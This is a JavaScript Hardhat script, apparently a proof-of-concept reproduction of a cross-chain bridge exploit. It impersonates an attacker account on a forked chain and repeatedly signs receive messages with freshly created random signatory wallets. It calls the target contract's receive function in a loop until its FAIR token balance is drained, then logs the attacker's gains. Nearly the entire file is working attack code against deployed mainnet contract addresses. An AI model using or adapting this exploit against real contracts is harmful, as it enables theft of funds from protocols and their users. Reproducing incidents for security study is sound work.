const hre = require("hardhat");
const ethers = hre.ethers;
const { ecsign } = require('ethereumjs-util')

async function main() {

  const ATTACKER_ADDRESS = '0xeda5066780de29d00dfb54581a707ef6f52d8113';
  const TARGET_CONTRACT_ADDRESS = '0xc5185d2c68aaa7c5f0921948f8135d01510d647f';
  const FAIR_TOKEN_ADDRESS = '0x9b20dabcec77f6289113e61893f7beefaeb1990a';
  const TARGET_ABI = '[{"anonymous":false,"inputs":[{"indexed":false,"internalType":"uint256","name":"fromChainId","type":"uint256"},{"indexed":true,"internalType":"address","name":"to","type":"address"},{"indexed":true,"internalType":"uint256","name":"nonce","type":"uint256"},{"indexed":false,"internalType":"uint256","name":"volume","type":"uint256"},{"indexed":true,"internalType":"address","name":"signatory","type":"address"}],"name":"Authorize","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"from","type":"address"},{"indexed":true,"internalType":"address","name":"to","type":"address"},{"indexed":false,"internalType":"uint256","name":"value","type":"uint256"}],"name":"ChargeFee","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"signatory","type":"address"},{"indexed":false,"internalType":"uint256","name":"decrement","type":"uint256"},{"indexed":false,"internalType":"uint256","name":"quota","type":"uint256"}],"name":"DecreaseAuthQuota","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"signatory","type":"address"},{"indexed":false,"internalType":"uint256","name":"increment","type":"uint256"},{"indexed":false,"internalType":"uint256","name":"quota","type":"uint256"}],"name":"IncreaseAuthQuota","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"uint256","name":"fromChainId","type":"uint256"},{"indexed":true,"internalType":"address","name":"to","type":"address"},{"indexed":true,"internalType":"uint256","name":"nonce","type":"uint256"},{"indexed":false,"internalType":"uint256","name":"volume","type":"uint256"}],"name":"Receive","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"from","type":"address"},{"indexed":true,"internalType":"uint256","name":"toChainId","type":"uint256"},{"indexed":true,"internalType":"address","name":"to","type":"address"},{"indexed":false,"internalType":"uint256","name":"nonce","type":"uint256"},{"indexed":false,"internalType":"uint256","name":"volume","type":"uint256"}],"name":"Send","type":"event"},{"inputs":[],"name":"DOMAIN_SEPARATOR","outputs":[{"internalType":"bytes32","name":"","type":"bytes32"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"DOMAIN_TYPEHASH","outputs":[{"internalType":"bytes32","name":"","type":"bytes32"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"RECEIVE_TYPEHASH","outputs":[{"internalType":"bytes32","name":"","type":"bytes32"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"factory_","type":"address"},{"internalType":"address","name":"token_","type":"address"}],"name":"__TokenMapped_init","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"factory_","type":"address"},{"internalType":"address","name":"token_","type":"address"}],"name":"__TokenMapped_init_unchained","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"signatory","type":"address"}],"name":"authQuotaOf","outputs":[{"internalType":"uint256","name":"quota","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"autoQuotaPeriod","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"autoQuotaRatio","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"cap","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"signatory","type":"address"},{"internalType":"uint256","name":"decrement","type":"uint256"}],"name":"decreaseAuthQuota","outputs":[{"internalType":"uint256","name":"quota","type":"uint256"}],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address[]","name":"signatories","type":"address[]"},{"internalType":"uint256[]","name":"decrements","type":"uint256[]"}],"name":"decreaseAuthQuotas","outputs":[{"internalType":"uint256[]","name":"quotas","type":"uint256[]"}],"stateMutability":"nonpayable","type":"function"},{"inputs":[],"name":"deployer","outputs":[{"internalType":"address","name":"","type":"address"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"factory","outputs":[{"internalType":"address","name":"","type":"address"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"signatory","type":"address"},{"internalType":"uint256","name":"increment","type":"uint256"}],"name":"increaseAuthQuota","outputs":[{"internalType":"uint256","name":"quota","type":"uint256"}],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address[]","name":"signatories","type":"address[]"},{"internalType":"uint256[]","name":"increments","type":"uint256[]"}],"name":"increaseAuthQuotas","outputs":[{"internalType":"uint256[]","name":"quotas","type":"uint256[]"}],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"","type":"address"}],"name":"lasttimeUpdateQuotaOf","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"mainChainId","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"needApprove","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"pure","type":"function"},{"inputs":[{"internalType":"uint256","name":"fromChainId","type":"uint256"},{"internalType":"address","name":"to","type":"address"},{"internalType":"uint256","name":"nonce","type":"uint256"},{"internalType":"uint256","name":"volume","type":"uint256"},{"components":[{"internalType":"address","name":"signatory","type":"address"},{"internalType":"uint8","name":"v","type":"uint8"},{"internalType":"bytes32","name":"r","type":"bytes32"},{"internalType":"bytes32","name":"s","type":"bytes32"}],"internalType":"struct Signature[]","name":"signatures","type":"tuple[]"}],"name":"receive","outputs":[],"stateMutability":"payable","type":"function"},{"inputs":[{"internalType":"uint256","name":"","type":"uint256"},{"internalType":"address","name":"","type":"address"},{"internalType":"uint256","name":"","type":"uint256"}],"name":"received","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"uint256","name":"toChainId","type":"uint256"},{"internalType":"address","name":"to","type":"address"},{"internalType":"uint256","name":"volume","type":"uint256"}],"name":"send","outputs":[{"internalType":"uint256","name":"nonce","type":"uint256"}],"stateMutability":"payable","type":"function"},{"inputs":[{"internalType":"address","name":"from","type":"address"},{"internalType":"uint256","name":"toChainId","type":"uint256"},{"internalType":"address","name":"to","type":"address"},{"internalType":"uint256","name":"volume","type":"uint256"}],"name":"sendFrom","outputs":[{"internalType":"uint256","name":"nonce","type":"uint256"}],"stateMutability":"payable","type":"function"},{"inputs":[{"internalType":"uint256","name":"","type":"uint256"},{"internalType":"address","name":"","type":"address"},{"internalType":"uint256","name":"","type":"uint256"}],"name":"sent","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"uint256","name":"","type":"uint256"},{"internalType":"address","name":"","type":"address"}],"name":"sentCount","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"uint256","name":"ratio","type":"uint256"},{"internalType":"uint256","name":"period","type":"uint256"}],"name":"setAutoQuota","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[],"name":"token","outputs":[{"internalType":"address","name":"","type":"address"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"totalMapped","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"}]';
  const ERC20_ABI = '[{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"owner","type":"address"},{"indexed":true,"internalType":"address","name":"spender","type":"address"},{"indexed":false,"internalType":"uint256","name":"value","type":"uint256"}],"name":"Approval","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"from","type":"address"},{"indexed":true,"internalType":"address","name":"to","type":"address"},{"indexed":false,"internalType":"uint256","name":"value","type":"uint256"}],"name":"Transfer","type":"event"},{"inputs":[{"internalType":"address","name":"owner","type":"address"},{"internalType":"address","name":"spender","type":"address"}],"name":"allowance","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"spender","type":"address"},{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"approve","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"account","type":"address"}],"name":"balanceOf","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"totalSupply","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"recipient","type":"address"},{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"transfer","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"sender","type":"address"},{"internalType":"address","name":"recipient","type":"address"},{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"transferFrom","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"}]';

  await hre.network.provider.request({
    method: "hardhat_impersonateAccount",
    params: [ATTACKER_ADDRESS],
  });

  const signer = await ethers.getSigner(ATTACKER_ADDRESS);  
  const targetContract = new ethers.Contract(TARGET_CONTRACT_ADDRESS, TARGET_ABI, signer);
  const fairTokenContract = new ethers.Contract(FAIR_TOKEN_ADDRESS, ERC20_ABI, signer);

  const fromChainId = 1;
  const ethFee = ethers.utils.parseUnits('0.005', 18);
  let nonce = 0;

  // Used to later build signatures
  const RECEIVE_TYPEHASH = await targetContract.RECEIVE_TYPEHASH();
  const DOMAIN_SEPARATOR = await targetContract.DOMAIN_SEPARATOR();
  
  // Instantiates a new wallet ("signatory") to sign first data
  let signatoryWallet = ethers.Wallet.createRandom();  
  let signatoryAddress = signatoryWallet.address;

  // Queries the "default" anount of assets that can be extracted with the signatory
  let volume = await targetContract.authQuotaOf(signatoryAddress);
  
  // Signs all data
  let signedData = getSignedData(
    DOMAIN_SEPARATOR,
    RECEIVE_TYPEHASH,
    fromChainId,
    ATTACKER_ADDRESS,
    nonce,
    volume,
    signatoryAddress,
    signatoryWallet.privateKey
  );

  const attackerInitialTokenBalance = await fairTokenContract.balanceOf(ATTACKER_ADDRESS);
  let victimTokenBalance = await fairTokenContract.balanceOf(targetContract.address);

  // Now the attacker account executes the `receive` function (each time with new signatory and signed data)
  // as long as they can continue extracting FAIR tokens
  while (victimTokenBalance > 0) {

    try {
      await targetContract.receive(
        fromChainId,
        ATTACKER_ADDRESS,
        nonce,
        volume,
        [[signatoryAddress, signedData.v, signedData.r, signedData.s]],
        { value: ethFee }
      );
    } catch (error) {
      break;
    }
    
    // Increments nonce (to avoid "withdrawn already" error)
    nonce += 1;

    // Creates a new signatory, and signs data again
    signatoryWallet = ethers.Wallet.createRandom();  
    signatoryAddress = signatoryWallet.address;

    volume = await targetContract.authQuotaOf(signatoryAddress);
    
    signedData = getSignedData(
      DOMAIN_SEPARATOR,
      RECEIVE_TYPEHASH,
      fromChainId,
      ATTACKER_ADDRESS,
      nonce,
      volume,
      signatoryAddress,
      signatoryWallet.privateKey
    );

    victimTokenBalance = await fairTokenContract.balanceOf(targetContract.address);
  }

  const attackerFinalTokenBalance = await fairTokenContract.balanceOf(ATTACKER_ADDRESS);

  console.log(`Attacker account started with ${ethers.utils.formatUnits(attackerInitialTokenBalance, 'ether')} FAIR tokens`);
  console.log(`Attacker account finished with ${ethers.utils.formatUnits(attackerFinalTokenBalance, 'ether')} FAIR tokens`);
}

// A utility function to build the signed data
function getSignedData(domainSeparator, receiveTypehash, fromChainId, attackerAddress, nonce, volume, signatoryAddress, signatoryKey) {
  const digest = ethers.utils.keccak256(
    ethers.utils.solidityPack(
      ['bytes1', 'bytes1', 'bytes32', 'bytes32'],
      [
        '0x19',
        '0x01',
        domainSeparator,
        ethers.utils.keccak256(
          ethers.utils.defaultAbiCoder.encode(
            ['bytes32','uint256','address','uint256','uint256','address'],
            [receiveTypehash, fromChainId, attackerAddress, nonce, volume, signatoryAddress]
          )
        )
      ]
    )
  );
  let { v, r, s } = ecsign(
    Buffer.from(digest.slice(2), 'hex'),
    Buffer.from(signatoryKey.slice(2), 'hex')
  );
  r = ethers.utils.hexlify(r);
  s = ethers.utils.hexlify(s);

  return {v, r, s};
}

main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error);
    process.exit(1);
  });
